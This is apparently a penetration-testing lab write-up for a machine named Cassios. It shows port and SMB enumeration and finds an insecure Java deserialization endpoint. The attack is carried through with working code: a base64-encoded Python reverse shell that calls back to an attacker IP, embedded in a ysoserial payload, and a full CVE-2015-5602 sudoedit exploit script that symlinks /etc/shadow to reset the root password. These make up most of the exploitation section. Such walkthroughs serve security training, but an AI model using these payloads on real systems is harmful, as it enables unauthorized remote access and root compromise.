# Cassios

### Enumeration

```
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS))
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS)
|_http-title: Landed by HTML5 UP
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp  open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)
8080/tcp open  http-proxy
```

```
$ smbmap -H 192.168.181.116

$ smbclient \\\\192.168.181.116\\Samantha\ Konstan  
Enter MYGROUP\furkan\'s password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Oct 31 18:09:20 2021
  ..                                  D        0  Thu Sep 24 13:38:10 2020
  recycler.ser                        N        0  Wed Sep 23 21:35:15 2020
  readme.txt                          N      478  Thu Sep 24 13:32:50 2020
  spring-mvc-quickstart-archetype     D        0  Thu Sep 24 13:36:11 2020
  thymeleafexamples-layouts           D        0  Thu Sep 24 13:37:09 2020
  resources.html                      N    42713  Thu Sep 24 13:37:41 2020
  pom-bak.xml                         N     2187  Thu Oct  1 16:28:46 2020

                8374272 blocks of size 1024. 6449104 blocks available
```

```
readme.txt

The recycler is a critical piece of our industrial infraestructure.
Please be careful with it!

The .ser file holds all the last data saved from the process, it can
be readed from the upper management dashboard app. 

Remember to set the location of the file to my home directory "~/backups".

Set this directory to share access so the remote system can access the
file via SMB.

Any concerns or suggestions, please reach at samantha@loca.host.

Samantha Konstan
Java Mantainer
```

```
gobuster -> http://192.168.181.116/backup_migrate/

- recycler.tar

WebSecurityConfig.java
    User.withDefaultPasswordEncoder()
    .username("recycler")
    .password("[REDACTED]")
```

on 8080 - When we click save current values, framework creates the recycler.sar file at \~/backups dir. We can access it from smb.

/home/samantha/backups/recycler.ser

When we click Check button on 8080, it reads recycler.ser file. **Insecure Deserialization?**

```
recycle.tar - extracted src dir
src/main/java/com/industrial/recycler/DashboardController.java

public class DashboardController {
	
	String filename = "/home/samantha/backups/recycler.ser";

	@GetMapping("/check")
	public String Check( String name, Model model) {

		Recycler r           = new Recycler();
	    	FileInputStream fis  = null;
	        ObjectInputStream in = null;
	        try {
	            fis = new FileInputStream(filename);
	            in  = new ObjectInputStream(fis);
	            r   = (Recycler) in.readObject();
	            in.close();
...
```

There is not any security checks for the .ser file. We can use it for initial foothold.

### Initial Access

Java object deserialization.&#x20;

https://github.com/frohoff/ysoserial&#x20;

https://book.hacktricks.xyz/pentesting-web/deserialization#exploit&#x20;

https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar

ysoserial-master-8eb5cbfbf6-1.jar

**Base64Encoded:** `export RHOST="192.168.49.181";export RPORT=80;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`

`java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxOTIuMTY4LjQ5LjE4MSI7ZXhwb3J0IFJQT1JUPTgwO3B5dGhvbiAtYyAnaW1wb3J0IHN5cyxzb2NrZXQsb3MscHR5O3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgob3MuZ2V0ZW52KCJSSE9TVCIpLGludChvcy5nZXRlbnYoIlJQT1JUIikpKSk7W29zLmR1cDIocy5maWxlbm8oKSxmZCkgZm9yIGZkIGluICgwLDEsMildO3B0eS5zcGF3bigiL2Jpbi9iYXNoIikn}|{base64,-d}|{bash,-i}" > recycler.ser`

Upload this file to smb.

Then click Check on 8080.

### PrivEsc

```
samantha@cassios tmp]$ sudo -l
sudo -l
Matching Defaults entries for samantha on cassios:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="QTDIR
    KDEDIR"

User samantha may run the following commands on cassios:
    (root) NOPASSWD: sudoedit /home/*/*/recycler.ser
```

Sudo <=1.8.14 Local Privilege Escalation

https://github.com/t0kx/privesc-CVE-2015-5602

**exploit.sh ->**&#x20;

```bash
#!/usr/bin/env bash
# CVE-2015-5602 exploit by t0kx
# https://github.com/t0kx/privesc-CVE-2015-5602

export EDITOR="/tmp/edit"
export FOLDER="${RANDOM}"
export PASSWD=$(printf ${RANDOM} \
		| md5sum \
		| awk '{print $1}')

prepare() {
cat << EOF >> /tmp/edit
#!/usr/bin/env bash
pass="$(printf "%q" $(openssl passwd -1 -salt ${RANDOM} ${PASSWD}))"
sed -i -e  "s,^root:[^:]\+:,root:\${pass}:," \${1}
EOF
}

main() {
	printf "[+] CVE-2015-5602 exploit by t0kx\n"
	printf "[+] Creating folder...\n"
	mkdir -p /home/${USER}/${FOLDER}/
	printf "[+] Creating symlink\n"
	ln -sf /etc/shadow /home/${USER}/${FOLDER}/recycler.ser
	printf "[+] Modify EDITOR...\n"
	prepare && chmod +x ${EDITOR}
	printf "[+] Change root password to: ${PASSWD}\n"
	sudoedit /home/${USER}/${FOLDER}/recycler.ser
	printf "[+] Done\n"
}; main
```

```
[samantha@cassios tmp]$ ./exploit.sh
[+] CVE-2015-5602 exploit by t0kx
[+] Creating folder...
[+] Creating symlink
[+] Modify EDITOR...
[+] Change root password to: e7ccbd117813eee6060129d6f8c76ecb
[+] Done
[samantha@cassios tmp]$ su root
Password: e7ccbd117813eee6060129d6f8c76ecb
```
